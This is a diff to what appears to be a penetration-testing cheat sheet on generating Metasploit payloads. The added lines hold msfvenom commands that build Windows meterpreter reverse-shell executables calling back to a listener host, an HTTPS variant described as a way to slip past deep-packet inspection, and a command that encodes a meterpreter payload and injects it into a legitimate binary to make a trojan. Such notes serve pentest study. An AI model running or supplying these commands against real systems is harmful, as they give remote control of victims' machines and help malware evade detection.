@@ -21,14 +21,23 @@ Therse is an important difference between non-staged and staged payload. A **non
 
 #### Meterpreter
 
+**Standard meterpreter**
 ```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.191 LPORT=445 -f exe -o shell_reverse.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -o shell_reverse.exe
 ```
 
 ```
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 ```
+
+**Meterpreter HTTPS**
+It makes the meterpreter-traffic look normal. Since it is hidden in https the communication is encrypted and can be used to bypass deep-packet inspections. 
+
+```
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.101 LPORT=443 -f exe -o met_https_reverse.exe
+```
+
 
 #### Non-staged payload
 
@@ -56,6 +65,9 @@ set payload windows/shell/reverse_tcp
 
 ### Inject payload into binary
 
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -e x86/shikata_ga_nai -i 9 -x "/somebinary.exe" -o bad_binary.exe
+```
 
 
 ## Bash
